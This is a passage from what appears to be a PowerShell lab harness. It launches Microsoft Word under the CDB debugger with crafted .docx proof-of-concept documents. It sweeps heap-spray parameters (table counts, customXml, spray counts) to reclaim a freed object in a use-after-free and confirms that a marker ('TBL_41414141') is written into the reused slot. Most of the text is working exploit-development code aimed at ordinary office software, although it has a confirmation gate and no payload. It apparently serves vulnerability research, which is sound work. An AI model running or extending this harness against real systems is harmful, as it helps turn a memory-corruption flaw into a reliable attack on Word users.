            $nextHeartbeat = (Get-Date).AddMinutes($HeartbeatMinutes)
        }
        Start-Sleep -Seconds 5
    }

    if (-not $seenTerminalEvent) {
        Write-Host "[!] Runtime wait reached $ObserveMinutes minutes without terminal CDB event. ObserveMode=$ObserveMode" -ForegroundColor Yellow
        Write-RuntimeEventSummary -CdbLog $cdbLog
        Write-PreviewTriggerDiagnostics -TriggerProcess $triggerProc -TriggerOut $triggerOut -TriggerErr $triggerErr
        Write-DiagnosticBundle -Directory $resultDir -AttemptId $AttemptId -AttachOut $attachOut -AttachErr $attachErr -AttachTrace $attachTrace -TriggerOut $triggerOut -TriggerErr $triggerErr -CdbCommandPath $cdbCmd -CdbLog $cdbLog
    }

    Wait-Process -Id $triggerProc.Id -Timeout 5 -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 10
    if (-not $hasCleanedUp) {
        Cleanup-AttemptProcesses -TriggerProcess $triggerProc -AttachProcess $attachProc
        $hasCleanedUp = $true
    }
    Write-WordMemoryMetrics -Label "after-cleanup" -ProcessId $wordPid
    $previewInitializeHr = ""
    if (Test-Path -LiteralPath $triggerOut) {
        $previewInitializeLine = Get-Content -LiteralPath $triggerOut -ErrorAction SilentlyContinue |
            Select-String -Pattern 'Initialize hr=0x[0-9A-Fa-f]+' |
            Select-Object -Last 1
        if ($previewInitializeLine -and $previewInitializeLine.Line -match '(0x[0-9A-Fa-f]+)') {
            $previewInitializeHr = $Matches[1]
        }
    }
    $previewTriggerExitCode = if ($triggerProc) { [string]$triggerProc.ExitCode } else { "" }
    $previewTriggerHasExited = if ($triggerProc) { [string]$triggerProc.HasExited } else { "" }

    # ---- Analyze the CDB log with runtime-aware context blocks ----
    Write-Host "`n=== CDB LOG ANALYSIS ==="
    if (-not (Test-Path $cdbLog)) {
        Write-Host "[-] Log not found: $cdbLog" -ForegroundColor Red
        return $null
    }

    $allLines = Get-Content $cdbLog

    # Runtime CDB lines:
    #   - contains [CDB_
    #   - not a CDB command prompt line like 0:045>
    #   - not banner/echo text
    #   - preserves lines where [CDB_] appears after whitespace or after ModLoad text
    $runtimeEventLines = @()
    for ($i = 0; $i -lt $allLines.Count; $i++) {
        $line = $allLines[$i]

        if (
            $line -match '\[CDB_' -and
            $line -notmatch '^\s*0:\d+>' -and
            $line -notmatch '^CDB PROOF' -and
            $line -notmatch 'bu\s+(wwlib|ntdll)' -and
            $line -notmatch '\.echo' -and
            $line -notmatch 'Numeric expression missing'
        ) {
            $runtimeEventLines += [pscustomobject]@{
                Index = $i
                Line  = $line
            }
        }
    }

    $runtimeText = ($runtimeEventLines | ForEach-Object { $_.Line }) -join "`n"
    $hasCdbCommandError = ($allLines -join "`n") -match 'Numeric expression missing'

    # Derive runtime evidence only from runtime event lines.
    $hasExactReuseRuntime = -not $hasCdbCommandError -and $runtimeText -match "\[CDB_EXACT_REUSE_RUNTIME\]"
    $hasWatchHit          = -not $hasCdbCommandError -and $runtimeText -match "\[CDB_WRITE_TO_REUSED_SLOT\]"
    $hasBadCleanup        = $runtimeText -match "\[CDB_BAD_CLEANUP_FDISPOSE\]"
    $hasBorrowedDOD       = $runtimeText -match "\[CDB_BAD_CLEANUP_FDISPOSE\].*same=1"
    $hasPayloadRelease    = $runtimeText -match "\[CDB_PAYLOAD_RELEASE_ENTER\]"

    function Get-FirstRuntimeEventIndex {
        param(
            [object[]]$Events,
            [string[]]$Patterns
        )

        foreach ($event in $Events) {
            foreach ($pattern in $Patterns) {
                if ($event.Line -match [regex]::Escape($pattern)) {
                    return [int]$event.Index
                }
            }
        }

        return -1
    }

    $rootCauseLineIndex = Get-FirstRuntimeEventIndex -Events $runtimeEventLines -Patterns @(
        "CDB_BAD_CLEANUP_FDISPOSE",
        "CDB_PAYLOAD_RELEASE_ENTER",
        "CDB_PAYLOAD_AFTER",
        "CDB_BAD_CLEANUP_RET"
    )
    $exactReuseLineIndex = Get-FirstRuntimeEventIndex -Events $runtimeEventLines -Patterns @("CDB_EXACT_REUSE_RUNTIME")
    $writeLineIndex = Get-FirstRuntimeEventIndex -Events $runtimeEventLines -Patterns @("CDB_WRITE_TO_REUSED_SLOT")
    $rootCauseToExactReuseLines = if ($rootCauseLineIndex -ge 0 -and $exactReuseLineIndex -ge 0) {
        $exactReuseLineIndex - $rootCauseLineIndex
    } else {
        -1
    }
    $exactReuseToWriteLines = if ($exactReuseLineIndex -ge 0 -and $writeLineIndex -ge 0) {
        $writeLineIndex - $exactReuseLineIndex
    } else {
        -1
    }

    # Extract the context block after a runtime tag, preserving db/dd/kb output.
    function Get-ContextBlockAfterTag {
        param(
            [string[]]$Lines,
            [string]$Tag,
            [int]$MaxLines = 80
        )

        $blocks = @()

        for ($i = 0; $i -lt $Lines.Count; $i++) {
            $line = $Lines[$i]

            $isRuntimeTag =
                $line -match [regex]::Escape($Tag) -and
                $line -notmatch '^\s*0:\d+>' -and
                $line -notmatch '^CDB PROOF' -and
                $line -notmatch 'bu\s+(wwlib|ntdll)' -and
                $line -notmatch '\.echo'

            if (-not $isRuntimeTag) { continue }

            $block = New-Object System.Collections.Generic.List[string]
            [void]$block.Add($line)

            for ($j = $i + 1; $j -lt $Lines.Count -and $j -lt ($i + $MaxLines); $j++) {
                $next = $Lines[$j]

                # Stop at next runtime CDB event, but keep dump/stack body lines.
                if (
                    $next -match '\[CDB_' -and
                    $next -notmatch '^\s*0:\d+>' -and
                    $next -notmatch 'bu\s+(wwlib|ntdll)' -and
                    $next -notmatch '\.echo' -and
                    $next -notmatch [regex]::Escape($Tag)
                ) {
                    break
                }

                # Stop at new CDB command prompt after body.
                if ($next -match '^\s*0:\d+>') {
                    break
                }

                [void]$block.Add($next)
            }

            $blocks += ,($block -join "`n")
        }

        return $blocks
    }

    # Context blocks preserve dump/stack lines after tags
    $reuseDumpBlocks = Get-ContextBlockAfterTag -Lines $allLines -Tag "[CDB_REUSE_INITIAL_DUMP]" -MaxLines 40
    $writeDumpBlocks = Get-ContextBlockAfterTag -Lines $allLines -Tag "[CDB_WRITE_DUMP]" -MaxLines 40
    $searchOutputBlocks = @()
    $searchOutputBlocks += Get-ContextBlockAfterTag -Lines $allLines -Tag "[CDB_WRITE_SEARCH_ASCII]" -MaxLines 30
    $searchOutputBlocks += Get-ContextBlockAfterTag -Lines $allLines -Tag "[CDB_WRITE_SEARCH_HEX]" -MaxLines 30
    $stackBlocks     = Get-ContextBlockAfterTag -Lines $allLines -Tag "[CDB_STACK]" -MaxLines 80

    function Test-SearchOutputBlockHasHit {
        param(
            [string]$Block
        )

        $lines = $Block -split "`r?`n"
        foreach ($line in $lines) {
            if (
                $line -match '^\s*[0-9a-fA-F`]{8,16}\s+' -and
                $line -notmatch '\[CDB_' -and
                $line -notmatch '^\s*0:\d+>'
            ) {
                return $true
            }
        }

        return $false
    }

    # Search for the marker inside preserved dump context blocks.
    $markerFound = $false
    if ($hasExactReuseRuntime) {
        $dumpSections = @()
        $dumpSections += $reuseDumpBlocks
        $dumpSections += $writeDumpBlocks
        $dumpSections += $searchOutputBlocks

        foreach ($section in $dumpSections) {
            if (
                $section -match "TBL_41414141" -or
                $section -match "54\s+42\s+4C\s+5F\s+34\s+31\s+34\s+31\s+34\s+31\s+34\s+31" -or
                $section -match "54\s+00\s+42\s+00\s+4C\s+00\s+5F\s+00\s+34\s+00\s+31\s+00\s+34\s+00\s+31\s+00\s+34\s+00\s+31\s+00\s+34\s+00\s+31" -or
                (Test-SearchOutputBlockHasHit -Block $section)
            ) {
                $markerFound = $true
                break
            }
        }
    }

    # Stack is preserved in the context body when exact reuse is observed.
    $stack = ""
    if ($hasExactReuseRuntime -and $stackBlocks.Count -gt 0) {
        $stack = $stackBlocks[0]
    }

    $postPayloadAllocSummary = Get-PostPayloadAllocSummary -RuntimeEventLines $runtimeEventLines

    return @{
        LogPath                = $cdbLog
        DocPath                = $targetDoc
        CdbCommandPath         = $cdbCmd
        TriggerOut             = $triggerOut
        TriggerErr             = $triggerErr
        AttachOut              = $attachOut
        AttachErr              = $attachErr
        AttachTrace            = $attachTrace
        HasExactReuseRuntime   = $hasExactReuseRuntime
        HasWatchHit            = $hasWatchHit
        MarkerFound            = $markerFound
        HasBadCleanup          = $hasBadCleanup
        HasBorrowedDOD         = $hasBorrowedDOD
        HasPayloadRelease      = $hasPayloadRelease
        Stack                  = $stack
        LogText                = $runtimeText
        RuntimeEventLines      = $runtimeEventLines
        ReuseDumpBlocks        = $reuseDumpBlocks
        WriteDumpBlocks        = $writeDumpBlocks
        SearchOutputBlocks     = $searchOutputBlocks
        SprayCompleted         = $sprayCompleted
        DurationSeconds        = $attemptStopwatch.Elapsed.TotalSeconds
        SprayDurationSeconds   = $sprayDurationSeconds
        SprayTablesPerSecond   = $sprayTablesPerSecond
        PreviewInitializeHr    = $previewInitializeHr
        PreviewTriggerExitCode = $previewTriggerExitCode
        PreviewTriggerHasExited = $previewTriggerHasExited
        WordPrivateBytesBeforeSpray = $wordMetricsBeforeSpray.PrivateBytes
        WordPrivateBytesAfterSpray  = $wordMetricsAfterSpray.PrivateBytes
        WordWorkingSetBeforeSpray   = $wordMetricsBeforeSpray.WorkingSet
        WordWorkingSetAfterSpray    = $wordMetricsAfterSpray.WorkingSet
        WordVirtualBytesBeforeSpray = $wordMetricsBeforeSpray.VirtualBytes
        WordVirtualBytesAfterSpray  = $wordMetricsAfterSpray.VirtualBytes
        PostPayloadAlloc20Count     = $postPayloadAllocSummary.Count
        FirstPostPayloadAlloc20Delta = $postPayloadAllocSummary.FirstDelta
        LastPostPayloadAlloc20Delta = $postPayloadAllocSummary.LastDelta
        ClosestPostPayloadAlloc20Delta = $postPayloadAllocSummary.ClosestDelta
        PostPayloadAllocSummary     = $postPayloadAllocSummary.Summary
        BestPostPayloadAllocSize    = $postPayloadAllocSummary.BestSize
        BestPostPayloadAllocDelta   = $postPayloadAllocSummary.BestDelta
        ClosestPositivePostPayloadAllocDelta = $postPayloadAllocSummary.ClosestPositiveDelta
        ClosestNegativePostPayloadAllocDelta = $postPayloadAllocSummary.ClosestNegativeDelta
        ClosestAbsolutePostPayloadAllocDelta = $postPayloadAllocSummary.ClosestAbsoluteDelta
        RootCauseToExactReuseLines  = $rootCauseToExactReuseLines
        ExactReuseToWriteLines      = $exactReuseToWriteLines
    }
    }
    finally {
        try {
            if ($null -ne $sprayDoc) {
                try { $sprayDoc.Close($false) } catch { }
                try { [System.Runtime.InteropServices.Marshal]::ReleaseComObject($sprayDoc) | Out-Null } catch { }
                $sprayDoc = $null
            }
            if ($null -ne $doc) {
                try { $doc.Close($false) } catch { }
                try { [System.Runtime.InteropServices.Marshal]::ReleaseComObject($doc) | Out-Null } catch { }
                $doc = $null
            }
            if ($null -ne $word) {
                try { $word.Quit() } catch { }
                try { [System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null } catch { }
                $word = $null
            }
            try {
                [GC]::Collect()
                [GC]::WaitForPendingFinalizers()
            } catch { }
        } catch { }

        if (-not $hasCleanedUp) {
            Cleanup-AttemptProcesses -TriggerProcess $triggerProc -AttachProcess $attachProc
            $hasCleanedUp = $true
        }
    }
}

Write-EffectiveConfig -Path $EffectiveConfigPath

if ($AnalyzeLogs) {
    Show-AttemptLogAnalysis -SummaryPath $AttemptSummaryPath -RankingPath $RankingPath
    return
}

if ($DryRunPlan) {
    Write-DryRunPlan
    return
}

Invoke-PreflightCheck -AllowsExistingWord ([bool]$AllowKillingExistingWord)

if (($Mode -eq "full" -or $ObserveMode -eq "deep" -or ($activeSprayCounts | Where-Object { $_ -gt 0 })) -and -not $IUnderstandThisKillsWord) {
    Write-Host "[!] This lab harness terminates WINWORD/cdb and changes Office recovery state. Re-run with -IUnderstandThisKillsWord to proceed." -ForegroundColor Yellow
    return
}

# ---- Main entry point ----
if ($Mode -eq "telemetry") {
    # ---- Telemetry mode ----
    Write-Host "[*] Telemetry mode: single run for exact-reuse stack capture" -ForegroundColor Cyan

    $templateDoc = Join-Path $docDir "poc-max-template.docx"
    if (-not (Test-Path $templateDoc)) {
        Write-Host "[*] Template not found. Generating..." -ForegroundColor Yellow
        Generate-Docx -Tables 1000 -CustomXml $true -Rpr $false -Order "tables_first" -OutputPath $templateDoc
    }

    $runDoc = Join-Path $docDir "poc-run-attempt-0001-$(Get-Date -Format 'yyyyMMdd-HHmmss').docx"
    Copy-Item $templateDoc $runDoc -Force

    $result = Run-Test -DocPath $runDoc -LogSuffix "telemetry" -SprayCount 0 -AttemptId 1

    if ($result -and $result.HasExactReuseRuntime) {
        Write-Host "[+] Exact reuse runtime detected!" -ForegroundColor Green
        if ($result.Stack) {
            Write-Host "`n=== CALL STACK ===" -ForegroundColor Cyan
            Write-Host $result.Stack
        }
        if ($result.MarkerFound) {
            Write-Host "[+] Marker found in reused slot!" -ForegroundColor Green
        } else {
            Write-Host "[-] Marker not found in reused slot." -ForegroundColor Yellow
        }
    } else {
        Write-Host "[-] Exact reuse runtime not detected in telemetry run." -ForegroundColor Yellow
        Write-Host "[*] Run full mode for parameter sweep." -ForegroundColor Cyan
    }
} else {
    # ---- Full parameter sweep mode ----
    Write-Host "[*] Full mode: parameter sweep for exact reuse with marker" -ForegroundColor Cyan

    # Generate the template once when needed.
    $templateDoc = Join-Path $docDir "poc-max-template.docx"
    if (-not (Test-Path $templateDoc)) {
        Generate-Docx -Tables 1000 -CustomXml $true -Rpr $false -Order "tables_first" -OutputPath $templateDoc
    }

    $success = $false
    $attemptPlan = @(Get-AttemptPlan)

    foreach ($plan in $attemptPlan) {
        if ($success) { break }

        $attempt = [int]$plan.AttemptId
        $repeat = [int]$plan.RepeatIndex
        $tables = [int]$plan.Tables
        $custom = [bool]$plan.CustomXml
        $rpr = [bool]$plan.Rpr
        $order = [string]$plan.Order
        $spray = [int]$plan.SprayCount
        $attemptStopwatch = [System.Diagnostics.Stopwatch]::StartNew()

        Write-Host "`n========================================" -ForegroundColor Cyan
        Write-Host "[*] Attempt #$attempt repeat=$repeat : tables=$tables, customXml=$custom, rPr=$rpr, order=$order, spray=$spray" -ForegroundColor Cyan
        Write-Host "========================================" -ForegroundColor Cyan

        $runDoc = Join-Path $docDir ("poc-run-attempt-{0:0000}-t{1}-{2}.docx" -f $attempt, $tables, (Get-Date -Format 'yyyyMMdd-HHmmss'))
        try {
            Copy-DocxFromCache -Tables $tables -CustomXml $custom -Rpr $rpr -Order $order -OutputPath $runDoc

            $result = Run-Test -DocPath $runDoc -LogSuffix "t$tables-c$custom-r$rpr-o$order-spray$spray-repeat$repeat" -SprayCount $spray -AttemptId $attempt
            if ($result) {
                $summaryArgs = @{
                    Path                         = $AttemptSummaryPath
                    Attempt                      = $attempt
                    RepeatIndex                  = $repeat
                    Tables                       = $tables
                    CustomXml                    = $custom
                    Rpr                          = $rpr
                    Order                        = $order
                    SprayCount                   = $spray
                    SprayCompleted               = $result.SprayCompleted
                    LogPath                      = $result.LogPath
                    DocPath                      = $result.DocPath
                    CdbCommandPath               = $result.CdbCommandPath
                    TriggerOut                   = $result.TriggerOut
                    TriggerErr                   = $result.TriggerErr
                    AttachOut                    = $result.AttachOut
                    AttachErr                    = $result.AttachErr
                    AttachTrace                  = $result.AttachTrace
                    DurationSeconds              = $result.DurationSeconds
                    HasBadCleanup                = $result.HasBadCleanup
                    HasBorrowedDOD               = $result.HasBorrowedDOD
                    HasPayloadRelease            = $result.HasPayloadRelease
                    HasExactReuseRuntime         = $result.HasExactReuseRuntime
                    HasWatchHit                  = $result.HasWatchHit
                    MarkerFound                  = $result.MarkerFound
                    WordPrivateBytesBeforeSpray  = $result.WordPrivateBytesBeforeSpray
                    WordPrivateBytesAfterSpray   = $result.WordPrivateBytesAfterSpray
                    WordWorkingSetBeforeSpray    = $result.WordWorkingSetBeforeSpray
                    WordWorkingSetAfterSpray     = $result.WordWorkingSetAfterSpray
                    WordVirtualBytesBeforeSpray  = $result.WordVirtualBytesBeforeSpray
                    WordVirtualBytesAfterSpray   = $result.WordVirtualBytesAfterSpray
                    SprayDurationSeconds         = $result.SprayDurationSeconds
                    SprayTablesPerSecond         = $result.SprayTablesPerSecond
                    PreviewInitializeHr          = $result.PreviewInitializeHr
                    PreviewTriggerExitCode       = $result.PreviewTriggerExitCode
                    PreviewTriggerHasExited      = $result.PreviewTriggerHasExited
                    PostPayloadAlloc20Count      = $result.PostPayloadAlloc20Count
                    FirstPostPayloadAlloc20Delta = $result.FirstPostPayloadAlloc20Delta
                    LastPostPayloadAlloc20Delta  = $result.LastPostPayloadAlloc20Delta
                    ClosestPostPayloadAlloc20Delta = $result.ClosestPostPayloadAlloc20Delta
                    PostPayloadAllocSummary      = $result.PostPayloadAllocSummary
                    BestPostPayloadAllocSize     = $result.BestPostPayloadAllocSize
                    BestPostPayloadAllocDelta    = $result.BestPostPayloadAllocDelta
                    ClosestPositivePostPayloadAllocDelta = $result.ClosestPositivePostPayloadAllocDelta
                    ClosestNegativePostPayloadAllocDelta = $result.ClosestNegativePostPayloadAllocDelta
                    ClosestAbsolutePostPayloadAllocDelta = $result.ClosestAbsolutePostPayloadAllocDelta
                    RootCauseToExactReuseLines   = $result.RootCauseToExactReuseLines
                    ExactReuseToWriteLines       = $result.ExactReuseToWriteLines
                }

                if ($result.HasExactReuseRuntime -and $result.HasWatchHit -and $result.MarkerFound) {
                    Write-Host "[+] SUCCESS! Exact reuse + write + marker found!" -ForegroundColor Green
                    Write-Host "[+] Parameters: tables=$tables, customXml=$custom, rPr=$rpr, order=$order, spray=$spray, repeat=$repeat" -ForegroundColor Green
                    Write-Host "[+] Log: $($result.LogPath)" -ForegroundColor Green
                    if ($result.Stack) {
                        Write-Host "`n=== CALL STACK ===" -ForegroundColor Cyan
                        Write-Host $result.Stack
                    }
                    Write-AttemptSummary @summaryArgs -Status "success"
                    if ($CleanArtifactsOnSuccess) {
                        Remove-AttemptArtifacts -Paths @($runDoc)
                    }
                    $success = $true
                    break
                } else {
                    Write-Host "[-] No success. Trying next planned attempt..." -ForegroundColor Yellow
                    Write-AttemptSummary @summaryArgs -Status "no-success"
                }
            } else {
                Write-Host "[-] Test execution error." -ForegroundColor Red
                Write-AttemptSummary -Path $AttemptSummaryPath -Attempt $attempt -RepeatIndex $repeat -Tables $tables -CustomXml $custom -Rpr $rpr -Order $order -SprayCount $spray -Status "no-result" -FailureKind "no-result" -DocPath $runDoc -DurationSeconds $attemptStopwatch.Elapsed.TotalSeconds
            }
        } catch {
            $attemptError = $_.Exception.Message
            if ($attemptError -match 'WINWORD cleanup failed after retry') {
                throw
            }
            Write-Host "[-] Attempt #$attempt failed: $attemptError" -ForegroundColor Red
            if (-not $KeepArtifactsOnFailure) {
                Remove-AttemptArtifacts -Paths @($runDoc)
            }
            Write-AttemptSummary -Path $AttemptSummaryPath -Attempt $attempt -RepeatIndex $repeat -Tables $tables -CustomXml $custom -Rpr $rpr -Order $order -SprayCount $spray -Status "failed" -FailureKind (Get-FailureKind -ErrorMessage $attemptError) -DocPath $runDoc -ErrorMessage $attemptError -DurationSeconds $attemptStopwatch.Elapsed.TotalSeconds
        }
    }

    Write-AttemptRanking -SummaryPath $AttemptSummaryPath -RankingPath $RankingPath

    if (-not $success) {
        Write-Host "[!] Exact reuse with marker was not achieved after all attempts." -ForegroundColor Red
        Write-Host "[*] All attempt logs are saved in $resultDir for analysis." -ForegroundColor Cyan
        Write-Host "[*] Review saved logs for root-cause/runtime evidence." -ForegroundColor Yellow
    }
}
